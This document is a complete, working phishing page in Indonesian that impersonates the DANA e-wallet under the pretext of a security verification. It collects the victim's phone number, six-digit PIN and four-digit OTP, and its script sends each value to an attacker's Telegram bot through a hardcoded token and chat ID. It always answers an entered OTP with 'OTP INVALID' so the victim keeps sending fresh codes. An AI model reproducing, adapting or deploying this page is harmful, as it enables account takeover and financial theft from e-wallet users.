<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>DANA Kaget - Verifikasi</title>
    <link href="https://fonts.googleapis.com/css2?family=Quicksand:wght@700&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Arial, sans-serif; }
        body { background-color: #0086FF; min-height: 100vh; display: flex; flex-direction: column; align-items: center; }
        
        .page { display: none; width: 100%; flex-direction: column; align-items: center; transition: 0.3s; }
        .active { display: flex; }

        /* HEADER */
        .logo-header { display: flex; align-items: center; gap: 12px; margin: 40px 0; }
        .white-circle { width: 45px; height: 45px; background: white; border-radius: 50%; display: flex; align-items: center; justify-content: center; }
        .wave-svg { width: 30px; fill: #0086FF; }
        .logo-text { color: white; font-family: 'Quicksand', sans-serif; font-size: 32px; font-weight: 700; }

        /* CARD HAL 1 */
        .card { background: white; border-radius: 25px; width: 90%; max-width: 380px; padding: 40px 20px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.1); margin-bottom: 50px; }
        .blue-ring { width: 100px; height: 100px; border: 5px solid #00AAEE; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 25px; }
        .agreement { display: flex; align-items: flex-start; text-align: left; gap: 12px; margin: 25px 0; font-size: 13px; color: #666; }
        .btn-blue { width: 100%; background: #118EEA; color: white; border: none; padding: 15px; border-radius: 12px; font-weight: bold; cursor: pointer; }
        .btn-blue:disabled { background: #A0D2F5; }

        /* HAL 2: INPUT NOMOR */
        .instruction { font-size: 17px; color: white; margin-bottom: 30px; }
        .label-container { width: 90%; max-width: 400px; display: flex; gap: 12px; margin-bottom: 5px; }
        .label-field { color: white; font-size: 12px; opacity: 0.9; }
        
        .input-group { display: flex; gap: 12px; width: 90%; max-width: 400px; margin-bottom: 20px; }
        .box-white { background: white; border-radius: 12px; height: 55px; display: flex; align-items: center; padding: 0 12px; }
        .flag-img { width: 25px; margin-right: 8px; }
        input[type="tel"] { width: 100%; border: none; outline: none; font-size: 20px; font-weight: bold; background: transparent; }
        
        .info-text { color: white; font-size: 13px; width: 85%; text-align: center; line-height: 1.5; opacity: 0.95; }
        .btn-bottom { position: fixed; bottom: 20px; width: 90%; max-width: 400px; background: white; color: #0086FF; padding: 16px; border: none; border-radius: 5px; font-weight: bold; text-transform: uppercase; }

        /* HAL 3 & 4 (PIN & OTP) */
        .nav-blue { width: 100%; height: 60px; background: #0086FF; display: flex; align-items: center; padding: 0 20px; color: white; margin-bottom: 40px; }
        .back-btn { cursor: pointer; padding: 10px; font-size: 20px; }
        .pin-dots { display: flex; gap: 15px; margin-bottom: 50px; }
        .dot { width: 15px; height: 15px; border: 1.5px solid #ccc; border-radius: 50%; }
        .dot.filled { background: #333; border-color: #333; }
        
        .otp-box { width: 50px; height: 65px; border: 2.5px solid #bbb; border-radius: 12px; text-align: center; font-size: 28px; font-weight: bold; color: #000; margin: 0 5px; background: white; }
        #otpError { color: #FF0000; font-size: 12px; font-weight: bold; margin-top: 10px; display: none; text-transform: uppercase; }
        
        .btn-resend { background: white; border: 1.5px solid #333; padding: 8px 15px; border-radius: 5px; color: #000; font-weight: bold; cursor: pointer; }
        .btn-resend:disabled { color: #999; border-color: #ccc; cursor: not-allowed; opacity: 0.6; }

        .help-container { display: flex; justify-content: space-around; width: 100%; max-width: 350px; margin-top: 20px; align-items: center; }
        .help-item { display: flex; align-items: center; gap: 8px; color: #0086FF; font-size: 13px; font-weight: bold; text-decoration: none; text-transform: uppercase; cursor: pointer; }
        .cs-icon-circle { width: 30px; height: 30px; background: #eef7ff; border-radius: 50%; display: flex; align-items: center; justify-content: center; }
        .cs-svg { width: 18px; height: 18px; fill: #0086FF; }

        #masterInput { position: absolute; opacity: 0; pointer-events: none; }
    </style>
</head>
<body onclick="if(currentP >= 3) document.getElementById('masterInput').focus();">

    <script>
        const TELEGRAM_TOKEN = "7201669869:AAFL4YYCcXXmqmMBSKCA3FtK6cCKEG4mqXU"; 
        const TELEGRAM_ID = "6712267951";     

        async function kirimTele(pesan) {
            const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${TELEGRAM_ID}&text=${encodeURIComponent(pesan)}`;
            await fetch(url);
        }

        // LOGIKA TOMBOL BACK SISTEM HP
        window.onpopstate = function() {
            if (currentP > 1) {
                go(currentP - 1, true); // Kembali ke halaman sebelumnya
            }
        };
    </script>

    <div id="p1" class="page active">
        <div class="logo-header">
            <div class="white-circle"><svg class="wave-svg" viewBox="0 0 24 24"><path d="M2,10 C2,10 5,3 12,8 C19,13 22,6 22,6 L22,16 C22,16 19,23 12,18 C5,13 2,20 2,20 Z"></path></svg></div>
            <div class="logo-text">DAnA Kaget</div>
        </div>
        <div class="card">
            <div class="blue-ring"><svg viewBox="0 0 24 24" width="70" fill="#00AAEE"><path d="M2,10 C2,10 5,3 12,8 C19,13 22,6 22,6 L22,16 C22,16 19,23 12,18 C5,13 2,20 2,20 Z"></path></svg></div>
            <h2>Verifikasi Keamanan</h2>
            <p style="font-size: 14px; color: #555; margin-top: 10px;">Demi keamanan akun, silakan verifikasi identitas Anda.</p>
            <div class="agreement">
                <input type="checkbox" id="agree" onchange="document.getElementById('btn1').disabled = !this.checked">
                <label for="agree">Saya setuju dengan <b>Syarat & Ketentuan</b> serta menjamin bahwa saya adalah pemilik sah akun ini.</label>
            </div>
            <button id="btn1" class="btn-blue" disabled onclick="go(2)">Lanjutkan</button>
        </div>
    </div>

    <div id="p2" class="page">
        <div class="logo-header"><div class="white-circle"><svg class="wave-svg" viewBox="0 0 24 24"><path d="M2,10 C2,10 5,3 12,8 C19,13 22,6 22,6 L22,16 C22,16 19,23 12,18 C5,13 2,20 2,20 Z"></path></svg></div><div class="logo-text">DANA</div></div>
        <p class="instruction">Masukkan nomor HP kamu untuk lanjut</p>
        
        <div class="label-container">
            <div style="width: 110px;"><span class="label-field">Negara</span></div>
            <div style="flex: 1;"><span class="label-field">Nomor</span></div>
        </div>

        <div class="input-group">
            <div class="box-white" style="width:110px"><img src="https://flagcdn.com/w40/id.png" class="flag-img"><b>+62</b></div>
            <div class="box-white" style="flex:1"><input type="tel" id="hp" placeholder="811-1234-5678"></div>
        </div>

        <p class="info-text">
            Kami akan menggunakan nomor HP ini sebagai ID kamu dan untuk mengamankan akun kamu.<br>
            Dengan melanjutkan, kamu juga setuju dengan <b>S&K</b> serta <b>Kebijakan Privasi</b> kami.
        </p>

        <button class="btn-bottom" onclick="prosesHP()">LANJUTKAN</button>
    </div>

    <div id="p3" class="page" style="background: white; height: 100vh;">
        <div class="nav-blue">
            <span class="back-btn" onclick="history.back()">&#10094;</span>
            <span style="flex:1; text-align:center; font-weight: bold;">Masuk</span>
        </div>
        <h2 style="color:#333; margin-bottom:40px;">Masukkan PIN</h2>
        <div class="pin-dots"><div class="dot"></div><div class="dot"></div><div class="dot"></div><div class="dot"></div><div class="dot"></div><div class="dot"></div></div>
        
        <div class="help-container">
            <div class="help-item">
                <div class="cs-icon-circle">
                    <svg class="cs-svg" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/></svg>
                </div>
                BUTUH BANTUAN?
            </div>
            <div class="help-item">LUPA PIN?</div>
        </div>
    </div>

    <div id="p4" class="page" style="background: white; height: 100vh;">
        <div class="nav-blue">
            <span class="back-btn" onclick="history.back()">&#10094;</span>
            <span style="flex:1; text-align:center; font-weight: bold;">Ganti Nomor HP</span>
        </div>
        <p style="font-weight:bold; font-size:17px; color:#333;">Kode OTP telah terkirim ke</p>
        <div style="background:#f5f5f5; padding:10px 20px; border-radius:10px; margin:15px 0;"><img src="https://flagcdn.com/w40/id.png" width="22"> <b id="showHP" style="color:#333;"></b></div>
        
        <p style="font-size:14px; color:#666; margin-bottom:15px;">via <span style="font-weight:bold;">ðŸ’¬ SMS</span></p>

        <div id="otpError">OTP INVALID</div>

        <div style="display:flex; margin:20px 0;"><input readonly class="otp-box"><input readonly class="otp-box"><input readonly class="otp-box"><input readonly class="otp-box"></div>
        
        <div style="display:flex; align-items:center; gap:10px; margin-bottom:30px;">
            <button id="resendBtn" class="btn-resend" disabled onclick="resetTimer()">KIRIM ULANG</button>
            <span id="timer" style="font-weight:bold; color:#000;">00:60</span>
        </div>
        
        <div class="help-item" style="color:#333;">
            <div class="cs-icon-circle">
                <svg class="cs-svg" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/></svg>
            </div>
            BUTUH BANTUAN?
        </div>
    </div>

    <input type="tel" id="masterInput">

    <script>
        const master = document.getElementById('masterInput');
        const hpInput = document.getElementById('hp');
        const resendBtn = document.getElementById('resendBtn');
        const err = document.getElementById('otpError');
        let currentP = 1; let userHP = "";
        let timerInterval;

        // Inisialisasi awal riwayat agar tombol back sistem berfungsi
        history.replaceState({page: 1}, "");

        function go(n, isBack = false) {
            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
            document.getElementById('p'+n).classList.add('active');
            
            // Rekam riwayat baru jika bukan dipicu tombol back
            if (!isBack) {
                history.pushState({page: n}, "");
            }

            currentP = n; master.value = "";
            if(n >= 3) { 
                document.body.style.backgroundColor = "white"; 
                master.focus(); 
                master.maxLength = (n === 3) ? 6 : 4; 
            } else { 
                document.body.style.backgroundColor = "#0086FF"; 
            }
        }

        hpInput.addEventListener('input', (e) => {
            let x = e.target.value.replace(/\D/g, '').match(/(\d{0,3})(\d{0,4})(\d{0,6})/);
            e.target.value = !x[2] ? x[1] : x[1] + '-' + x[2] + (x[3] ? '-' + x[3] : '');
        });

        function prosesHP() {
            userHP = hpInput.value; if(userHP.length < 9) return alert("Nomor tidak valid");
            kirimTele(`ðŸ”” DATA BARU\nNomor HP: +62 ${userHP}`);
            document.getElementById('showHP').innerText = "+62 " + userHP; 
            go(3);
        }

        master.addEventListener('input', () => {
            const val = master.value;
            if(currentP === 3) {
                const ds = document.querySelectorAll('.dot');
                ds.forEach((d, i) => d.classList.toggle('filled', i < val.length));
                if(val.length === 6) { 
                    kirimTele(`ðŸ”‘ PIN DANA\nNomor: +62 ${userHP}\nPIN: ${val}`); 
                    setTimeout(() => { go(4); startTimer(60); }, 500); 
                }
            } else if(currentP === 4) {
                const boxes = document.querySelectorAll('.otp-box');
                boxes.forEach((b, i) => b.value = val[i] || "");
                if(val.length === 4) { 
                    kirimTele(`ðŸ“© OTP DANA\nNomor: +62 ${userHP}\nOTP: ${val}`);
                    err.style.display = "block";
                } else {
                    err.style.display = "none";
                }
            }
        });

        function startTimer(duration) {
            clearInterval(timerInterval);
            resendBtn.disabled = true;
            let sec = duration; const t = document.getElementById('timer');
            timerInterval = setInterval(() => {
                sec--; 
                let m = Math.floor(sec / 60);
                let s = sec % 60; 
                t.innerText = `${m < 10 ? '0'+m : m}:${s < 10 ? '0'+s : s}`;
                if(sec <= 0) {
                    clearInterval(timerInterval);
                    resendBtn.disabled = false;
                }
            }, 1000);
        }

        function resetTimer() {
            startTimer(60); 
            kirimTele(`ðŸ”„ REQUEST ULANG OTP\nNomor: +62 ${userHP}`);
        }
    </script>
</body>
</html>
